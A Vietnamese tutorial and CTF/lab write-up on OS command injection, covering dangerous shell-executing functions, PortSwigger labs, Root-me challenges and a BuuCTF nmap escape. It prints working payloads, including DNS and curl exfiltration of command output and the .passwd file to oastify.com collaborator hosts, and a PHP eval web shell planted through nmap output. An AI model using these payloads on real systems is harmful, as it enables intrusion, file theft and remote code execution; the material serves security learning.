


# I. Khái Quát

Command injection vulnerabilities chỉ loại lỗ hổng cho phép kẻ tấn công "inject" và thực thi tùy ý các câu lệnh tương ứng với hệ điều hành đang vận hành của hệ thống. Bởi vậy kiểu tấn công này còn có một tên gọi khác là Shell injection : 

- Payload inject là các lệnh shell như id, whoami, ls, ... và có thể thay đổi với tùy hệ điều hành khác nhau
- Kẻ tấn công có đặc quyền của ứng dụng bị xâm nhập, ví dụ với ứng dụng web thường mang đặc quyền www-data


## Một số lệnh shell và ký tự đặc biệt thường dùng trong tấn công command injection trên hệ điều hành Linux

Khi kiểm tra tấn công command injection thành công trên mục tiêu, chúng ta có thể khai thác hệ thống theo một số hướng sau : 
- Định danh người dùng hiện tại bằng lệnh `whoami` 
- Liệt kê tên tệp, thư mục bằng `ls`
- Đọc file với các lệnh `cat`, `tac`, `head`, `tail`, ...

| Purpose of command         | Linux           | Windows        |
|-----------------------------|-----------------|----------------|
| Tên người dùng hiện tại    | whoami          | whoami         |
| OS                          | uname -a        | ver            |
| Cấu hình mạng              | ifconfig        | ipconfig       |
| Kết nối mạng               | netstat -an     | netstat -an    |
| Tiến trình đang chạy       | ps -ef          | tasklist       |


Bảng tổng hợp các ký tự thường sử dụng cùng với công dụng của chúng:

| Câu lệnh              | Ý nghĩa                                                                                                       |
|-----------------------|---------------------------------------------------------------------------------------------------------------|
| cmd1 \| cmd2          | Kết quả của cmd1 trở thành tham số truyền vào của cmd2, dù cmd1 thực thi thành công hay thất bại đều sẽ thực thi cmd2 |
| cmd1 \|\| cmd2        | cmd1 thực thi thất bại thì cmd2 mới thực thi                                                                    |
| cmd1 ; cmd2           | cmd1 thực thi thành công hay thất bại đều sẽ thực thi cmd2                                                        |
| cmd1 & cmd2           | cmd1 và cmd2 thực thi một cách đồng thời, nhưng lệnh cmd2 sẽ được thực hiện ngay cả khi cmd1 chưa hoàn thành                                                    |
| cmd1 && cmd2          | cmd1 thực thi thành công thì cmd2 mới thực thi                                                                  |
| ( cmd1; cmd2; cmd3 )  | thực thi đồng thời cmd1, cmd2, cmd3                                                                             |
| cmd1 %0A cmd2  | cmd1 thực thi thành công hay thất bại đều sẽ thực thi cmd2                                                                               |


Các hàm thông dụng phục vụ cho mục đích đọc nội dung file:

```php
highlight_file($filename);
show_source($filename);
print_r(php_strip_white($filename));
print_r(file_get_contents($filename));
readfile($filename);
print_r(file($filename)); // var_dump
fread(fopen($filename, "r"), $size);
include($filename); // không phải file php
include_once($filename); // không phải file php
require($filename); // không phải file php
require_once($filename); // không phải file php
```

Các hàm thông dụng phục vụ cho mục đích duyệt thư mục:

```php    
print_r(glob("*")); // liệt kê các file trong thư mục hiện tại
print_r(glob("/*")); // liệt kê các file trong thư mục gốc
print_r(scandir("."));
print_r(scandir("/"));
var_export(scandir("/"));
var_dump(scandir("/"));
$d=opendir(".");while(false!==($f=readdir($d))){echo"$f\n";}
$d=dir(".");while(false!==($f=$d->read())){echo$f."\n";}
$a=glob("/*");foreach($a as $value){echo $value." "};
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}

```

# II. Phân tích lỗ hổng command injection

## 1. Nguyên nhân 

Khi một hệ thống sử dụng trực tiếp input từ người dùng (Cookie, HTTP Header, parameter, ...) đóng vai trò là tham số truyền vào thực thi trong lệnh shell, trong đó không có các cơ chế bảo vệ hoặc quá trình filter lỏng lẻo sẽ dẫn tới lỗ hổng Command injection. Khi đó hệ thống sẽ thực thi vô điều kiện các input nguy hiểm này!

## 2. Một số hàm có thể dẫn tới command injection

### a. PHP 

- **Hàm system()**

`Cú pháp: system(string $command, int &$result_code = null)`

Thực thi và in ra kết quả lệnh `$command`. Ví dụ: 

```php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    system($cmd);
}
```

![image](https://hackmd.io/_uploads/HJIJnaiuT.png)

**- Hàm exec()**

`Cú pháp: exec(string $command, array &$output = null, int &$result_code = null)`

Thực thi lệnh `$command`. Nếu có biến `$output` sẽ lưu kết quả vào $output dưới dạng mảng. Ví dụ:

```php
$output = null;
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    exec($cmd, $output);
    var_dump($output);
}
```
![image](https://hackmd.io/_uploads/Hkzo2Tjdp.png)

- **Hàm passthru()**


`Cú pháp: passthru(string $command, int &$result_code = null)`

Thực thi và in ra kết quả lệnh $command. Ví dụ:

```
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    passthru($cmd);
}
```
![image](https://hackmd.io/_uploads/BJ9Oppod6.png)

- **Hàm shell_exec()**


`Cú pháp: shell_exec(string $command)`

Thực thi lệnh `$command`. Ví dụ:

```
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo $output;
}
```
![image](https://hackmd.io/_uploads/SJQzATi_T.png)

- **Hàm popen()**


`Cú pháp: popen(string $command, string $mode)`

Mở một "đường ống" dẫn đến chương trình được chỉ định trong biến `$command`. Ví dụ:

```
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $content = popen($file, "r");
    $read = fread($content, 2096);
    echo $read;
    pclose($content);
}
```
![image](https://hackmd.io/_uploads/S17YApjda.png)

- **Hàm proc_open()**

```Cú pháp: proc_open(array|string $command, array $descriptor_spec, array &$pipes, ?string $cwd = null, ?array $env_vars = null, ?array $options = null)```

Công dụng giống với popen() nhưng cung cấp mức độ kiểm soát lớn hơn trong việc thực thi chương trình.

- Cặp ký tự backtick: \` \`


PHP sẽ thực thi nội dung của các tham số được đặt trong cặp \` \` (backtick)  dưới dạng lệnh shell.

```php 
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo `$cmd`;
}
```
![image](https://hackmd.io/_uploads/HkEtIGn_T.png)

### b. Python 

- **Hàm system()**


`Cú pháp: system(command)`

- **Hàm popen()**

`Cú pháp: popen(cmd, mode='r', buffering=-1)`

- **Hàm subprocess.call()/subprocess.run()**


```Cú pháp: subprocess.call(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None, **other_popen_kwargs)```

### c. Java

`java.lang.Runtime.getRuntime().exec(command)`

# III. Khai thác lỗ hổng command injection

## 1. Lỗ hổng command injection simple

### a. Phân tích

Xét một trang web mua sắm gồm chức năng kiểm tra số lượng sản phẩm còn lại trong kho với URL như sau:

`https://insecure-website.com/stockStatus?productID=381&storeID=29`

Trong đó, trang web sử dụng các tham số `productID` và `storeID` truyền vào trong câu lệnh shell như sau:

`stockreport.pl 390 22`

Câu lệnh sẽ trả vể kết quả trong giao diện người dùng. Chú ý rằng ở đây, hai tham số `productID` và `storeID` có thể bị thay đổi bởi người dùng, nên chúng ta có thể lợi dụng cơ chế này tạo ra một cuộc tấn công Command injection. Kẻ tấn công có thể truyền cho tham số `productID` giá trị `& echo haha &`. Khi đó câu lệnh shell trở thành:

`stockreport.pl & echo haha & 22`

3 lệnh thực thi đồng thời: `stockreport.pl`, `echo haha` và `22`. Khi đó trong giao diện trả về kết quả như sau:

```
Error - productID was not provided
haha
22: command not found
```

- Ở dòng đâu tiên, lệnh `stockreport.pl` thực thi thất bại do thiếu tham số truyền vào
- Câu lệnh thứ hai thực thi thành công
- Câu lệnh thứ ba : `22` hệ thống không tìm thấy lệnh này dẫn tới error

### [b. Lab OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)

![image](https://hackmd.io/_uploads/HySapG2Oa.png)

Biết rằng hệ thống sử dụng các tham số `productId` và `storeId` yêu cầu từ người dùng trả về kết quả sau khi thực thi lệnh shell tại server.

Để giải quyết bài lab, chúng ta cần thực thi lệnh whoami trả về kết quả người dùng hiện tại trong server.

Trong mục `view details` , chức năng Check stock cho phép người dùng kiểm tra số lượng đơn hàng còn lại trong kho.

![image](https://hackmd.io/_uploads/ByRJemhup.png)

Quan sát request trong Burp Suite:

![image](https://hackmd.io/_uploads/Syamg7nup.png)

Chúng ta thấy request sử dụng phương thức POST truyền tới hệ thống hai tham số productId và storeId. Hai giá trị này có thể thay đổi tùy ý bởi người dùng.

Do hệ thống truyền trực tiếp giá trị các tham số này vào câu lệnh shell, nên chúng ta có thể thay đổi giá trị nhằm thực thi lệnh shell tùy ý

- Payload 1: Sử dụng `;` ngắt lệnh, sau đó thực thi lệnh whoami: 
![image](https://hackmd.io/_uploads/ByvogX2_6.png)

- Payload 2: Ngắt lệnh bằng `|`: 
![image](https://hackmd.io/_uploads/HyiAlQ3OT.png)

- Payload 3: Ngắt lệnh bằng `%0a`:
![image](https://hackmd.io/_uploads/rJV6Zm2OT.png)


## 2. Lỗ hổng Blind OS command injection

Không phải lúc nào trang web cũng sẽ trả về kết quả lệnh shell chúng ta inject rõ ràng như trong trường hợp trên, nó sẽ hiển thị kết quả gián tiếp thông qua các lệnh ghi dữ liệu khác. Dạng lỗ hổng này được gọi là Blind command injection vulnerabilities.

Xét một trang web chứa chức năng cho phép người dùng điền thông tin cá nhân khi đặt hàng, trong đó người dùng có nhập địa chỉ email và thông báo đặt hàng thành công sẽ được phản hồi tới email của họ. Để thực hiện điều này, trang web thực thi chương trình gửi thư với đầu vào là email từ người dùng như sau:

`mail -s "Content of Email" -aFrom:peter@normal-user.net notification@vulnerable-website.com`

Tất nhiên ở trường hợp này sẽ không phản hồi kết quả của các lệnh shell do người dùng inject. Vậy thì vấn đề đặt ra là, làm sao để kiểm tra, hay có dấu hiệu gì giúp chúng ta xác định dạng lỗ hổng "blind" này?

## a. Kiểm tra lỗ hổng Blind OS command injection bằng time delays

###  Phân tích

Chúng ta có thể kiểm tra lỗ hổng này bằng cách sử dụng một lệnh sau khi inject sẽ khiến phản hồi hệ thống chứa độ trễ thời gian. Qua đó bằng cách quan sát cho phép chúng ta xác nhận rằng lệnh đã được thực thi dựa trên thời gian ứng dụng delay và phản hồi :

`& ping -c 10 127.0.0.1 &` hoặc `; sleep 10 ;`

Ví dụ dòng lệnh trên sẽ khiến ứng dụng thực hiện ping tới localhost hoặc sleep trong 10 giây

### [Thực hành Lab Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

![image](https://hackmd.io/_uploads/H1WskB3up.png)


Trang web chứa lỗ hổng Command injection dạng blind trong chức năng feedback từ người dùng, tuy nhiên output không được hiển thị. Biết rằng hệ thống thực thi lệnh shell tại server với các tham số đầu vào từ người dùng. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng khiến hệ thống bị delay trong 10 giây.

Chức năng Submit feedback cho phép người dùng nhập các trường name, email, subject, messsage. Những giá trị này được truyền tới hệ thống qua phương thức POST:

![image](https://hackmd.io/_uploads/HygakS2O6.png)

Nhập dữ liệu và quan sát trong burp suit : 

![image](https://hackmd.io/_uploads/BkVABp3OT.png)

Ta thử thêm `;` vào lần lượt các trường `Name`, `Email`, `Subject`, `Message` thì để ý thấy trường `Email` trả về thông báo khác với các trường còn lại 

![image](https://hackmd.io/_uploads/rJFs862O6.png)

Vậy ta sẽ inject ở trường email để time delay 

![image](https://hackmd.io/_uploads/BkXlDanOa.png)

### [Thực hành Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

![image](https://hackmd.io/_uploads/rJn0Pahdp.png)

Vẫn là blind command injection ở tính năng feedback, nhưng ở lab này ta có thể ghi output của command ra file `a.txt` tại folder có quyền ghi là `/var/ww/images` .

![image](https://hackmd.io/_uploads/HkqGYTn_6.png)


Cuối cùng đọc thông qua `GET /image?filename=a.txt`

Step 1 : 

![image](https://hackmd.io/_uploads/Syjgqp2dp.png)

![image](https://hackmd.io/_uploads/HyQmcph_T.png)


Step 2 : 

![image](https://hackmd.io/_uploads/r1aL5p2dT.png)

## b. Kiểm tra lỗ hổng Blind command injection bằng kỹ thuật out-of-band (OAST)

### Phân tích

Đối với phương pháp sử dụng độ trễ thời gian, có thể xảy ra sai sót do ảnh hưởng của nhiều yếu tố như tốc độ đường truyền và không đồng bộ hệ thống. Ta cần một phương pháp "chắc chắn" hơn bằng cách tạo ra sự tương tác từ mục tiêu đến một địa điểm khác, sử dụng lệnh shell injection và DNS Lookup tới một domain khác.

Bình thường khi tấn công mục tiêu, thì chỉ có trao đổi qua lại giữa chúng ta và mục tiêu, không có sự tham gia của một đối tượng/thiết bị thứ ba, có thể hiểu quá trình hoàn toàn “khép kín”. Khi có sự tham gia của một đối tượng thứ ba để hỗ trợ cuộc khai thác sẽ được gọi là tấn công ngoài băng tần (OAST).

Mình đã phân tích DNS khá kĩ ở [tại đây](https://hackmd.io/oPD3hL5uSiiuZx6u7MS8Mg?view#1-Domain-Name-System)

Ta sẽ sử dụng tính năng Burp Collaborator (trong bản Burp Suite Professional) để hỗ trợ việc này.

 

Khi inject payload tới mục tiêu, trong đó thực hiện công việc gửi truy vấn tới url Burp Collaborator, nếu payload thực thi thành công, hệ thống sẽ tạo một sự tương tác tới Burp Collaborator, chúng ta có thể kiểm tra sự kiện tương tác này. 

Các lệnh thường sử dụng trong các trường hợp này có thể kể đến như dig, nslookup, ...

### [Thực hành lab Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

![image](https://hackmd.io/_uploads/H1yakC2Op.png)

Để giải quyết bài lab, chúng ta cần thực hiện DNS lookup với Burp Collaborator nhằm kiểm tra lỗ hổng blind OS Command injection.

Kiểm tra DNS lookup trong chức năng Submit feedback bằng cách sử dụng lệnh dig hoặc nslookup : 

![image](https://hackmd.io/_uploads/SJDz-0hOp.png)

Kết quả

![image](https://hackmd.io/_uploads/S15YbC2uT.png)

### [Thực hành Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

![image](https://hackmd.io/_uploads/S1awzR2dT.png)


 Để giải quyết bài lab, chúng ta cần thực hiện lệnh whoami và trích xuất kết quả hiển thị thông qua truy vấn DNS tới Burp Collaborator.

Payload có thể như sau : 

- \||host+\`whoami`.kh54c9mjama6lraf9zm9ez4as1ysmja8.oastify.com||
- \||nslookup+\`whoami`.kh54c9mjama6lraf9zm9ez4as1ysmja8.oastify.com||
- `;nslookup+$(whoami).kh54c9mjama6lraf9zm9ez4as1ysmja8.oastify.com;`

Step 1 : 

![image](https://hackmd.io/_uploads/BJR67AhO6.png)

Step 2: 

![image](https://hackmd.io/_uploads/rkY440hOp.png)

## 3. Các kĩ thuật bypass filter 

Ta có thể tham khảo [tại đây](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) và [tại đây](https://github.com/payloadbox/command-injection-payload-list)

## 4. Các biện pháp ngăn chặn lỗ hổng command injection

- Có một quá trình kiểm tra chặt chẽ đầu vào từ người dùng như ngăn chặn tất cả các ký tự đặc biệt không cần thiết, yêu cầu input cần tuân theo một regular expression cụ thể.

- Sử dụng kết hợp blacklist, whitelist các từ khóa.

Đọc thêm tại đây : https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

# IV. Root-me 

## [PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)

![image](https://hackmd.io/_uploads/SkMclkpOT.png)

Trang web có chức năng ping tới địa chỉ ip chỉ định, và thực hiện in kết quả ra . Dễ thấy trang web dính lỗi cmdi

![image](https://hackmd.io/_uploads/SyntBOp_p.png)

Và vì đề bài bảo rằng flag nằm trong file index.php, nên ta sẽ in ra cả file index.php bằng payload sau :`127.0.0.1 ; cat index.php`

![image](https://hackmd.io/_uploads/By7vIu6da.png)

Kết quả hiển thị ra hơi sai sai , ta thử view page source thì thấy được đoạn code

![image](https://hackmd.io/_uploads/r1daLuT_p.png)


Từ đoạn code trên ta thấy flag đang được lưu tại file `.passwd` , vậy ta chỉ cần cat file đó ra thôi . Payload như sau : `127.0.0.1 ; cat ./.passwd`

![image](https://hackmd.io/_uploads/Hke_vO6ua.png)

Ta đã tìm được flag : `S3rv1ceP1n9Sup3rS3cure`

## [Command injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)

![image](https://hackmd.io/_uploads/ByrsrWa_T.png)

Chall này có chức năng tương tự chall trước , nhưng sẽ không hiển thị ra kết quả mà chỉ in ra `Ping OK` nếu thực hiện thành công 

![image](https://hackmd.io/_uploads/S1n8cuTdT.png)

Nếu ta thử inject payload như bài trước thì nó sẽ trả về `Syntax Error`
![image](https://hackmd.io/_uploads/ry2O2u6dT.png)

Bài này chính là phiên bản đã được nâng cấp của bài trước nên nó đã filter các kí tự đặc biệt dùng để ngắt lệnh , do vậy bây giờ ta phải tìm cách để bypass filter sau đó sẽ thực hiện chuyển hướng kết quả ra bên ngoài , nơi ta có thể thấy được.

Bây giờ ta sẽ tìm xem kí tự ngắt lệnh nào có thể dùng được bằng cách thử intruder payload list mình được sau đây [link](https://github.com/payloadbox/command-injection-payload-list)

Step 1 : 

![image](https://hackmd.io/_uploads/B1IaHFp_6.png)

Step 2 : 

![image](https://hackmd.io/_uploads/SJv_SY6up.png)

Step 3 : 

![image](https://hackmd.io/_uploads/SyA5BKad6.png)

Step 4 : 

![image](https://hackmd.io/_uploads/S1nMLKa_p.png)

Ta tìm được kí tự `%0A` có thể dùng được , bây giờ ta chỉ việc inject để lấy source của file index.php thông qua kĩ thuật out-of-band bằng burp collaborator , payload như sau : 

`ip=127.0.0.1%0A curl -X POST -d @index.php fgzjsa8pu1q0ztb44niutkcvjmpdd51u.oastify.com`

> Kí tự @ dùng để gửi file

Kết quả : 

![image](https://hackmd.io/_uploads/S1R8mKT_a.png)

Và trong source ghi flag nằm ở file `.passwd`, bây giờ ta chỉ cần đọc file `.passwd` là xong : 

``ip=127.0.0.1%0A curl -X POST -d @./.passwd fgzjsa8pu1q0ztb44niutkcvjmpdd51u.oastify.com``


Kết quả :  

![image](https://hackmd.io/_uploads/BypeEtpuT.png)

`Flag : Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!`

# V. BuuCTF 

## [[网鼎杯 2020 朱雀组]Nmap1](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap)

![image](https://hackmd.io/_uploads/ByENBdfF6.png)


Bài này mình sẽ write up lại dưới hình thức whitebox , cách hoạt động của chall như sau : 

```php    
<?php
define('RESULTS_PATH', 'xml/');
define('NMAP_ARGS', '-Pn -T4 -F --host-timeout 1000ms');

if (isset($_POST['host'])) {

    $host = $_POST['host'];

    if (stripos($host, 'php') !== false) {
        die("Hacker...");
    }

    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);

    $filename = substr(md5(time() . rand(1, 10)), 0, 5);
    $command = "nmap " . NMAP_ARGS . " -oX " . RESULTS_PATH . $filename . " " . $host;
    
    $result_scan = shell_exec($command);

    if (is_null($result_scan)) {
        die('Something went wrong');
    } else {
        header('Location: result.php?f=' . $filename);
    }
}
?>
//flag is in /flag
```

Dựa vào đoạn code trên thì ta thấy biến $host do ta nhập vào sẽ được filter 2 lần : 

Step 1 : `$host = escapeshellarg($host);`

Step 2 : `$host = escapeshellcmd($host);`

Bây giờ ta sẽ phân tích xem 2 hàm trên hoạt động như thế nào : 

### escapeshellarg

![image](https://hackmd.io/_uploads/SyjdRDfY6.png)

Ví dụ ta nhập một chuối là :
```468 ' abc```

Step 1 : Escape dấu nháy đơn

`468 \' abc`

Step 2 : Sau đó gói `\'` bên trong dấu nháy đơn

`468 '\'' abc`

Step 3 : Đem toàn bộ chuỗi vào bên trong dấu nháy đơn

`'468 '\'' abc'`

Kết quả : 

![image](https://hackmd.io/_uploads/S1PPfOGY6.png)


### escapeshellcmd()

![image](https://hackmd.io/_uploads/BkH6gdzYp.png)

Tiếp tục với chuỗi ban nãy `'468 '\'' abc'`

Sau khi qua hàm escapeshellcmd()

`'468 '\\'' abc\'`

![image](https://hackmd.io/_uploads/SJ6NfdfKT.png)

Kết quả 

![image](https://hackmd.io/_uploads/HyUJXOfK6.png) 

Quay trở lại challenge , thì chall sử dụng nmap , ý tưởng là sẽ dùng file `/flag` làm input sau đó ouput sẽ là một file `test`. Sau đó truy cập file test để lấy flag  

Ta sử sử dụng cú pháp sau : 

![image](https://hackmd.io/_uploads/rk6AB_zKa.png)

Thử nghiệm 

![image](https://hackmd.io/_uploads/r1cSWKGKT.png)


Mặc dù thông báo fail , nhưng nó đã giúp ta đọc được nội dung bên trong.

![image](https://hackmd.io/_uploads/ByU8WFMY6.png)


Thật là vi diệu , để ý từ những thử nghiệm ở trên thì sẽ còn thừa một dấu `'` ở cuối cùng. Cơ mà không sao cả nó là một phần của tên file thôi. Nếu không thích thì thêm dấu `#` ở cuối cùng để comment lại là xong

Thực hành : 

Payload : ` 127.0.0.1 ' -iL /flag -o nightc0r3 #`

![image](https://hackmd.io/_uploads/BJfLtdfKT.png)


Mặc dù nó trả về thông báo fail như vầy 

![image](https://hackmd.io/_uploads/ByezOuftp.png)

Nhưng khi truy cập thì vẫn OK và có flag ở trỏng : 

![image](https://hackmd.io/_uploads/SJ8g9uGYp.png)

Flag : `flag{8041c978-5f67-41fd-8622-cdddd4cfccee}`

### RCE

Ta cũng có thể RCE được, như ta thấy thì trong file reusult nó cũng sẽ lưu tại câu lệnh nmap 

![image](https://hackmd.io/_uploads/r13ri_MY6.png)

Nếu đầu vào của ta là một đoạn code php , và sẽ lưu kết quả vào một file `.php` luôn thì =))) 

Nó sẽ kiểu như vầy

![image](https://hackmd.io/_uploads/SyEJnOzFp.png)

Nếu nó là một file `.txt` thì sẽ hoàn toàn vô hại nhưng do file chứa kết quả có phần name do mình kiểm soát được nên mình có thể cho nó vào một file php để thực thi.

- Ở đây do từ `php` do bị filter nên chúng ta sẽ dùng `<?= ?>` , và `.phtml` để thay thế

Payload : `' <?= @eval($_GET[1]); ?> -oG hacked.phtml #`

![image](https://hackmd.io/_uploads/B1MQ0_fKp.png)

Sau đó truy gập `hacked.phtml?1=phpinfo();`

Kết quả 

![image](https://hackmd.io/_uploads/B1auROMF6.png)

![image](https://hackmd.io/_uploads/rymYkFGKT.png)

Done !!!

# Tham khảo 

https://viblo.asia/p/os-command-injection-vulnerabilities-cac-lo-hong-command-injection-phan-1-BQyJK3KRJMe

https://viblo.asia/p/os-command-injection-vulnerabilities-cac-lo-hong-command-injection-phan-2-AZoJj7zgLY7

https://viblo.asia/p/os-command-injection-vulnerabilities-cac-lo-hong-command-injection-phan-3-pgjLNbrwL32

https://viblo.asia/p/os-command-injection-la-gi-command-injection-co-nguy-hiem-khong-can-cuc-ky-than-trong-doi-voi-cac-lenh-os-goi-tu-website-cua-ban-OeVKB3PEZkW

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

https://portswigger.net/web-security/os-command-injection

https://www.oreilly.com/library/view/learning-the-bash/1565923472/ch01s09.html

https://github.com/payloadbox/command-injection-payload-list

https://www.cnblogs.com/AikN/p/15727575.html

https://gtfoargs.github.io/

https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html